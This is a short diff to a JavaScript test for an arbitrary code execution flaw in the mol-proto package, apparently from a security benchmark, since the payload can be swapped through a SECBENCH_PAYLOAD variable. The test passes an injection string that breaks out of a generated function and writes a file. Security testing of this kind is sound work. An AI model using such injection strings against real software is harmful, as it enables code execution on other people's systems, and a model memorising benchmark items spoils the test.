@@ -9,7 +9,7 @@ test("Arbitrary code execution in mol-proto", () => {
     mp.makeFunction(
       "a",
       "b",
-      "};require('fs').writeFileSync('./mol-proto', '');{"
+      process.env.SECBENCH_PAYLOAD || ("};require('fs').writeFileSync('./mol-proto', '');{")
     );
   } catch (error) {}
   file_exist = fs.existsSync(path);
